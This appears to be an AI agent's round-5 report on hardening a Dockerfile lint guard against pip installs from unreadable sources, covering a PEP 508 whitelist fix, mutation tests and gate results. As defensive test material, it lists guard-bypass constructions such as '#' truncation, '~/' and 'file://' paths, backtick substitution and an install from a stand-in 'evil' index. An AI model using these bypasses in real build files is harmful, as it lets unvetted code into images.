- `ops/check-pins` reports `failed=1` (`P-SAFE-05`, solar fixtures) rather than the claimed `failed=0`.
  Identical on the base branch `task/T-0038` (`PINS ok=9 ... failed=1`), so it is pre-existing and
  environmental, unrelated to this change.
- `ops/test` could not be reproduced green here; it stops at a vitest/JUnit reporting step before reaching
  anything this PR touches. Not attributable to this change.
- `git diff --stat task/T-0038 task/T-0046 -- services/etl/Dockerfile` is empty: the "Dockerfile untouched"
  claim holds. `python -m pytest -q` -> `46 passed` reproduces exactly.

**Verdict: FAIL.** Stays in `queue/review/`. Blocker 1 is three concrete fail-open holes in a guard whose
whole thesis is failing closed; blocker 2 is why they were invisible. Fixing blocker 2 first would surface
blocker 1 without another review round.

- 2026-09-08 agent/builder-9: **round 5 fixes - both blockers, plus two more holes of the same class found
  while fixing them, plus the NOTE.** Pushed `9c48aa3`. Every finding below was reproduced here before it
  was fixed; every check added was demonstrated red by a mutation and green on restore. Exit codes come
  from `subprocess.returncode`, never from grepping output for failure words.

### Verdict on each round-5 finding

| finding | verdict | where |
|---|---|---|
| BLOCKER 1(a) unquoted `#` truncates the arglist, returned `ok=True` | **CONFIRMED** | RED 1 below |
| BLOCKER 1(b) `~/` defeats the local-path gate | **CONFIRMED** | RED 1 below |
| BLOCKER 1(c) `file://` matches neither guard | **CONFIRMED** | RED 1 below |
| BLOCKER 2 the guard has zero automated coverage; the new test is vacuous | **CONFIRMED** | RED 2 below |
| NOTE the whitelist's provenance is not pinned anywhere | **CONFIRMED** - and I cannot reproduce "pip 26.1.1" either | fix 4 below |
| not-held: 436 lines over the 300 cap (T-0062) | accepted, and **now worse: 544 (see the addendum)**. See "left undone" | |
| not-held: `check-pins failed=1` (P-SAFE-05) | reproduced, pre-existing | gates below |
| not-held: `ops/test` not green here | reproduced, different stage than the reviewer saw | gates below |

Nothing in round 5 is refuted. The reviewer ran the commands and every one of them reproduces.

### RED 1 - the three bypasses, against the unmodified parser (`.artifacts/probe_r5.py`)

`shlex` default commenters = `'#'`, and:

    GREEN | RUN pip install --break-system-packages pkg#egg=z -r requirements.txt
            tokens=[['--break-system-packages', 'pkg']]                     offenders=[] unparsable=False
    GREEN | RUN pip install --break-system-packages pkg#egg=z ./localpkg
            tokens=[['--break-system-packages', 'pkg']]                     offenders=[] unparsable=False
    GREEN | RUN pip install --break-system-packages ~/localpkg              offenders=[]
    GREEN | RUN pip install --break-system-packages ~localpkg               offenders=[]
    GREEN | RUN pip install --break-system-packages file:///w/wheels/evil.whl   offenders=[]
    GREEN | RUN pip install --break-system-packages svn+ssh://example.org/pkg   offenders=[]
    RED   | RUN pip install --break-system-packages -r requirements.txt     (control, still caught)
    RED   | RUN pip install --break-system-packages ./localpkg              (control, still caught)

`PIP_FROM_NETWORK` covers `hg+https://` and nothing else in that family - confirmed directly:

    no match | RUN pip install file:///w/wheels/evil.whl
    MATCH    | RUN pip install hg+https://example.org/pkg
    no match | RUN pip install svn+ssh://example.org/pkg
    no match | RUN pip install ftp://example.org/pkg.tar.gz

### RED 2 - the coverage claim, reproduced exactly (`.artifacts/probe_vacuity.py`, `.artifacts/mutate.py`)

    RUN count = 1 | pip install invocation count = 0 | pip_indirect_target_offenders() = []

    baseline                          -> 46 passed, PYTEST EXIT=0
    pip_indirect_targets -> []        -> 46 passed, PYTEST EXIT=0

Byte-identical outcome with the entire whitelist engine neutered, as reported.

### Two more holes of the same class, found while fixing the first three

Not in the review; found by asking what else the positional branch cannot see. Both were GREEN before:

    GREEN | RUN pip install --break-system-packages `cat req.txt`
            tokens=[['--break-system-packages', '`cat', 'req.txt`']] offenders=[]

  Backtick command substitution. `$(...)` was caught only because the token contains a literal `$`;
  backticks are not `$`, so the same construct in the older spelling walked through.

    GREEN | RUN pip install --break-system-packages requests>=2.31.0
            tokens=[['--break-system-packages', 'requests', '>', '=2.31.0']] offenders=[]

  Not a bypass - a false positive waiting to happen, and the reason the positional whitelist below could
  not be written until it was fixed. `shlex(..., punctuation_chars=True)` split the single most common
  argument pip ever receives into three fragments. It was harmless only while every fragment fell through
  a permissive "not a flag, therefore fine" default. The command separators `punctuation_chars` was
  presumably enabled for are already handled by `_split_unquoted`, quote-aware, before `shlex` is called.

### The fix, and why it is shaped this way

The brief for this round was: a fix that keeps being re-broken is anchored on the wrong thing. It was.
Round 3 turned the *flag* half of `pip_indirect_targets` into a whitelist - a flag not positively
recognized is an offender - and that half has held. The *positional* half stayed a blacklist of remembered
bad prefixes (`.`, `..`, `./`, `../`, `/`), and every round since has found one more character nobody had
thought of: `./localpkg` (r1), `"./localpkg"` (r2), then `~/`, `file://` and backticks (r5). Adding `~`
and `://` to the tuple, which is what the review suggests as a minimum, would have been the fifth patch of
that shape.

1. **Positionals are now a whitelist too** (`PIP_REQUIREMENT_SPECIFIER`). A positional is safe only if it
   positively matches a PEP 508 dependency specification - PEP 503 name, optional extras, optional version
   specifiers, optional environment marker - and is not a distribution-archive filename. `@` (PEP 508
   direct URL references), `:`, `/`, `~`, `#`, backticks, `$` and the empty string are all outside that
   grammar, so they fail closed without this file needing to have heard of them. This closes 1(b), 1(c),
   backticks, `-` (stdin), `""`, `dist/x.whl` and `\\host\share` in one rule.
2. **The archive-suffix rule** is the one place the name rule is not enough: PEP 503 permits `.` in a name,
   so `mypkg-1.0.tar.gz` and `evil.whl` satisfy it while naming a local archive. The suffix set is fixed by
   the packaging specs, not by pip's CLI, so unlike the flag lists it does not drift with pip releases.
3. **`lexer.commenters = ""`** closes 1(a). Cleared outright rather than taught shell's word-start rule -
   over-refusing a genuine trailing `# comment` inside a RUN is a cost this file takes knowingly, and it is
   zero today. `punctuation_chars=False` for the reason above.
4. **Provenance** (the NOTE). `PIP_WHITELIST_VALIDATED_AGAINST = "26.1.1"` now sits next to the lists.
   I cannot reproduce round 4's validation either - the only pip reachable here is 23.0.1, and I confirm
   the reviewer's count exactly: 8 entries absent from it (`--build-constraint`,
   `--requirements-from-script`, `--group`, `--all-releases`, `--only-final`, `--uploaded-prior-to`,
   `--keyring-provider`, `--resume-retries`). I am not calling them invented; I have no pip 26.1.1. Two
   checks now stand where prose stood:
   - `test_no_whitelisted_flag_abbreviates_an_unreadable_target_flag` - the round-4 bug as a pure string
     invariant needing no pip at all. `--build` was dangerous because pip resolves unambiguous
     abbreviations and `--build` abbreviates `--build-constraint`. Any safe-list entry that is a proper
     prefix of an unreadable-target entry rebuilds that hole. Verified it fires: putting `--build` back
     turns it red (M8).
   - `test_whitelisted_flag_arity_matches_the_reachable_pip` - cross-checks against whatever pip is
     importable. Deliberately **not** an existence check: "absent from this pip" is ambiguous between
     invented and added-later, and asserting on it would fail every box without exactly 26.1.1. Arity is
     unambiguous, and getting it wrong is fail-OPEN in the direction that matters - a boolean listed as
     value-taking makes `skip_next` swallow the next token, so `pip install --dry-run ./localpkg` would
     skip the local path. **63 of 71 entries verified against pip 23.0.1, 0 mismatches.**

### The coverage that was missing - `services/etl/tests/test_dockerfile_pip_parser.py` (new, 272 lines)

BLOCKER 2 is the one that made the others invisible, so it is the one that got the most work. 34
blind-spot cases and 14 ordinary-install cases, each a real construction from a real review round and
labelled with the round that found it, all run through the **same** `pip_offenders_in` the Dockerfile check
calls - `pip_indirect_target_offenders` was refactored onto it so the tests cannot drift onto a parallel
implementation. The parser is a pure function over strings, so none of this needs Docker. That matters
here: **Docker is reachable only through WSL on this box, so the pinned image was not built or run for any
claim in this entry** - and the image contains no pip at all (apt `python3` + `python3-pytest`), so there
was never a pip in it to test against.

Three guards keep the tables from going hollow the way the old test did:

- `test_every_case_reaches_the_parser` - **vacuity guard.** Every case in both tables must yield at least
  one extracted `pip install`. Without it, a broken extractor would let the 14 ordinary cases pass on an
  empty set and report the guard as working.
- `test_the_case_tables_are_populated` - **vacuity guard.** A parametrized test over an empty table passes
  without running once. M6 below is what that looks like.
- `test_every_offender_reason_is_demonstrated_by_a_case` - **anti-decay.** The set of reasons the engine
  can emit is declared as `PIP_OFFENDER_REASONS`; a new refusal reason must arrive with a case that shows
  it red. This is the check that would have made round 4's uncovered landing impossible.

### RED/GREEN - ten mutations (`.artifacts/demo_redgreen.py`, full transcript `.artifacts/redgreen.txt`)

Each mutation reverts exactly one part of this change or breaks one precondition, runs the full ETL suite,
and is restored from a file backup (no git). `EXIT` is the pytest process's own exit code.

    GREEN BASELINE (fix applied, no mutation)                    EXIT=0   102 passed

    M1  commenters='#' restored (undo 1a)                        EXIT=1   2 failed, 100 passed
        red: blind_spot[r5a: shlex commenters dropped everything after '#' ...]
             blind_spot[r5a: '#' also hid an otherwise-caught local path]
    M2  punctuation_chars=True restored                          EXIT=1   2 failed, 100 passed
        red: ordinary[r5: punctuation_chars split this into ['requests', '>', '=2.31.0']]
             ordinary[extras plus a version range]
    M3  round 4's ./ ../ / blacklist restored (undo 1b/1c)       EXIT=1   13 failed, 87 passed
        red: blind_spot[r5b: ~ ...] [r5b: ~user form] [r5c: file://] [r5c: svn+ssh] [r5c: hg+https]
             [r5: backtick substitution] [r5: bare wheel filename] [r5: same, sdist]
             [r5: relative path with no ./ prefix] [r5: '-' is stdin] [r5: the empty argument]
             [r5a: '#' ...] and test_the_direct_url_check_still_owns_plain_url_installs
    M4  pip_indirect_targets -> []  (the reviewer's mutation)    EXIT=1   35 failed, 65 passed
        the mutation that was invisible at 46 passed now takes 35 tests with it
    M5  pip_install_arglists -> []  (vacuity precondition)       EXIT=1   37 failed, 63 passed
        red: includes test_every_case_reaches_the_parser
    M6  case table emptied            (vacuity precondition)     EXIT=1   2 failed, 64 passed, 1 skipped
        red: test_the_case_tables_are_populated (+ the reason guard). Note the shape: 34 parametrized
        tests SILENTLY VANISH and the suite still reports 64 passed. Only the vacuity guard says so.
    M7  a new refusal reason with no case demonstrating it       EXIT=1   1 failed, 99 passed
        red: test_every_offender_reason_is_demonstrated_by_a_case
    M8  '--build' put back on the safe whitelist                 EXIT=1   2 failed, 100 passed
        red: test_no_whitelisted_flag_abbreviates_an_unreadable_target_flag, and blind_spot[r4: --build]
        i.e. round 4's blocker is now caught at commit time, with no pip and no review round
    M9  '--dry-run' also listed as value-taking                  EXIT=1   1 failed, 101 passed
        red: test_whitelisted_flag_arity_matches_the_reachable_pip
    M10 pip's option table comes back empty (vacuity)            EXIT=1   1 failed, 101 passed
        red: test_whitelisted_flag_arity_matches_the_reachable_pip - it fails rather than comparing nothing

    GREEN AFTER RESTORE                                          EXIT=0   102 passed

Every one of the ten preconditions actually reproduced - each mutation's anchor was asserted unique before
it was applied, and each red names the specific cases it should, not just a non-zero exit.

### After the fix, the round-5 constructions and every earlier round's (`.artifacts/probe_r5.py`)

    RED | pkg#egg=z -r requirements.txt      offenders=[('pkg#egg=z', not a PEP 508 requirement...), ('-r', ...)]
    RED | pkg#egg=z ./localpkg               both tokens named
    RED | ~/localpkg          RED | ~localpkg
    RED | file:///w/wheels/evil.whl          RED | svn+ssh://example.org/pkg    RED | hg+https://...
    RED | -r requirements.txt   RED | ./localpkg   RED | $REQS        (controls, unchanged)
    GREEN | requests           GREEN | "requests; python_version>='3.8'"
    GREEN | --target /opt/vendor requests    GREEN | apt-get update && apt-get install -y python3

### Gates

    cd services/etl && python -m pytest -q      -> 102 passed, EXIT=0   (was 46)
    bash ops/sane                               -> SANE OK, EXIT=0
    bash ops/queue-check                        -> QUEUE OK (67 tasks), EXIT=0
    bash ops/lib/check-line-cap                 -> P-SRC-02: 9 Swift files, none over 300, EXIT=0
    bash ops/check-pins                         -> PINS ok=9 pending=3 failed=1, EXIT=1
    bash ops/test                               -> EXIT=1

`check-pins` fails on **P-SAFE-05** (solar fixtures, ScenicKit) exactly as the reviewer reported, and this
branch's own commits touch nothing under `Sources/` or `Tests/` - `git diff --stat 03cfdd0..HEAD` is the
two Python test files and nothing else. Pre-existing and unrelated.

`ops/test` fails earlier than the reviewer saw it fail, in the Swift build, with a compiler crash and no
file or line attached:

    error: emit-module command failed with exit code 1 (use -v to see invocation)
    error: fatalError
    FAIL: swift test produced no JUnit report (expected .artifacts/spm-junit*.xml)

A Swift 6.3.3 toolchain crash cannot be caused by two Python test files. I did **not** verify it on the
base branch, because doing so needs a second worktree and this session is confined to `.worktrees/T-0046`;
I am reporting what it does here rather than asserting it is pre-existing.

`services/etl/Dockerfile` is untouched: `git diff --stat 03cfdd0..HEAD -- services/etl/Dockerfile` is empty.

### Left undone, recorded rather than dropped

1. **`test_dockerfile.py` is now 544 lines, up from 436** against the 300-line cap - I made an accepted
   debt 25% worse. T-0062 already owns the split and depends on this task. I did not do it here for a
   specific reason, not to avoid the work: T-0062's own brief requires deleting the exemption entry from
   `ops/lib/check-line-cap` once the file is under the cap, and that path is outside this task's
   `touches: [services/etl/]`. Splitting here would land the seam and leave the exemption stale, which
   T-0062 says is itself a reported failure. The natural seam is now obvious and is noted in T-0062:
   the whole pip parser (`PIP_*` constants, `_split_unquoted`, `_shlex_tokens`, `pip_install_arglists`,
   `pip_indirect_targets`, `pip_offenders_in`) moves to a helper module, which also removes this round's
   one real smell - a test module importing a parser from another test module. T-0062's line count has
   been corrected from 436 to 544 in its brief.
2. **`PIP_FROM_NETWORK` is still a substring match** and still owns only `https?://`, `git+`,
   `--index-url`, `--extra-index-url`, `--find-links`. It is not widened here: the indirect guard now
   fails closed on every URL scheme as a non-specifier, so the two together are closed, and
   `test_the_direct_url_check_still_owns_plain_url_installs` pins that division of labour so neither test
   is silently assumed to cover the other's cases.
3. **The pinned image was never built or run** - Docker is WSL-only here. Nothing in this entry depends on
   it: the parser is pure string handling, and the image has no pip. The one thing I cannot show is that
   the suite passes under the image's Python 3.12 / pytest 7.4; it was run on Python 3.10 / pytest 9.1.1,
   and the new file uses no syntax or API newer than 3.10.
4. **`PIP_WHITELIST_VALIDATED_AGAINST = "26.1.1"` is still a claim inherited from round 4**, now at least
   written where a check can read it. The arity cross-check verifies 63 of 71 entries against pip 23.0.1;
   the 8 that only a pip 26.x could confirm remain unconfirmed by anyone on this branch. Someone with a
   pip 26.1.1 should run `test_whitelisted_flag_arity_matches_the_reachable_pip` there - it will then
   cover all 71 and the "NOT the recorded version" wording will drop out of the failure message.

### Addendum, same day - attacking the round-5 fix found one more hole of the same species

Pushed `be9cff6`. Before handing back I ran 22 constructions at the *fixed* parser
(`.artifacts/probe_attack.py`), checking both guards the way the two Dockerfile tests combine them. Two
came back green that should not have:

    GREEN [NOBODY] RUN pip install -f /local/wheels requests
    GREEN [NOBODY] RUN pip install -i /local/index requests
    RED   [PIP_FROM_NETWORK] RUN pip install --find-links /local/wheels requests
    RED   [PIP_FROM_NETWORK] RUN pip install --index-url /local/index requests

A pure short/long asymmetry, and the same species as everything else on this task. `--find-links` and
`--index-url` are literals inside `PIP_FROM_NETWORK`, so the long spellings were always caught - but by
that test, not this one, because the indirect guard had them on its *destination-value* list and skipped
their values. `-f` and `-i` are spellings `PIP_FROM_NETWORK` has never known, so nothing looked at them at
all. `pip install -i https://evil/simple requests` was caught only incidentally, by `https://` appearing in
the value; `-i /local/index` has no URL in it and was green. Round 4 found this same asymmetry in the
harmless direction (`-q` whitelisted, `--quiet` not); this is its fail-open direction.

Fixed by moving the whole family onto one list rather than by adding two letters:

- `-f`, `-i`: `PIP_DESTINATION_VALUE_LETTERS` -> `PIP_UNREADABLE_TARGET_LETTERS`.
- `--index-url`, `--extra-index-url`, `--find-links`: `PIP_DESTINATION_VALUE_FLAGS_LONG` ->
  `PIP_UNREADABLE_TARGET_FLAGS_LONG`. An index or a link page is a place whose contents decide what gets
  installed, which is that list's own definition. Both guards now catch the family in both spellings, and
  `PIP_FROM_NETWORK` is a backstop rather than the sole owner of it.
- `test_the_direct_url_check_still_owns_plain_url_installs` is replaced by
  `test_the_two_guards_agree_on_everything_that_names_a_package_source`, which pins that agreement so
  neither guard can be narrowed again on the assumption the other covers it.

**Checked against real pip and NOT a finding:** `pip install pkg --config-settings ./localpkg` stays green.
Rather than reason about it, I ran it - pip 23.0.1, with a real `localpkg/pyproject.toml` present:

    $ pip install --dry-run --no-index --no-build-isolation ./localpkg
      rc=1   Processing c:\...\.artifacts\pipprobe\localpkg          <- control: a bare dir IS a source
    $ pip install --dry-run --no-index --no-build-isolation --config-settings ./localpkg not-a-real-pkg
      rc=2   Usage: ... [options] <requirement specifier> ...        <- usage error, localpkg NOT processed

So skipping a `--config-settings` value is correct, and `-C`/`--config-settings` and `-t`/`--target` stay
on the destination list. 20 of the 22 constructions are now red; the other green is
`pip install -U --user requests`, which is an ordinary install and should be green.

### Final numbers

    GREEN BASELINE                                               EXIT=0   106 passed
    M1  commenters='#' restored                                  EXIT=1   2 failed, 104 passed
    M2  punctuation_chars=True restored                          EXIT=1   2 failed, 104 passed
    M3  round 4's ./ ../ / blacklist restored                    EXIT=1   13 failed, 93 passed
    M4  pip_indirect_targets -> []                               EXIT=1   38 failed, 68 passed
    M5  pip_install_arglists -> []                               EXIT=1   40 failed, 66 passed
    M6  case table emptied                                       EXIT=1   2 failed, 67 passed, 1 skipped
    M7  new refusal reason, no case                              EXIT=1   1 failed, 105 passed
    M8  '--build' back on the safe whitelist                     EXIT=1   2 failed, 104 passed
    M9  '--dry-run' also listed as value-taking                  EXIT=1   1 failed, 105 passed
    M10 pip's option table comes back empty                      EXIT=1   1 failed, 105 passed
    M11 -f/-i back on the destination list                       EXIT=1   4 failed, 102 passed
        red: blind_spot[-f is --find-links], blind_spot[-i is --index-url],
             blind_spot[the same behind --no-index], test_the_two_guards_agree_...
    M12 --index-url/--extra-index-url/--find-links moved back    EXIT=1   1 failed, 105 passed
        red: test_the_two_guards_agree_on_everything_that_names_a_package_source
    GREEN AFTER RESTORE                                          EXIT=0   106 passed

    cd services/etl && python -m pytest -q   -> 106 passed, EXIT=0   (46 at the start of this round)
    bash ops/sane                            -> SANE OK, EXIT=0
    bash ops/queue-check                     -> QUEUE OK (67 tasks), EXIT=0
    bash ops/lib/check-line-cap              -> EXIT=0 (Swift-only on this branch; T-0058 not merged here)
    bash ops/check-pins                      -> PINS ok=9 pending=3 failed=1 (P-SAFE-05), EXIT=1, pre-existing
    bash ops/test                            -> EXIT=1, Swift toolchain crash, see above

`test_dockerfile.py` finishes the round at **544** lines and `test_dockerfile_pip_parser.py` at 272;
T-0062's brief has been corrected to match and now names the seam.

Handing back to agent/reviewer-pr29. Task stays in `queue/review/`.
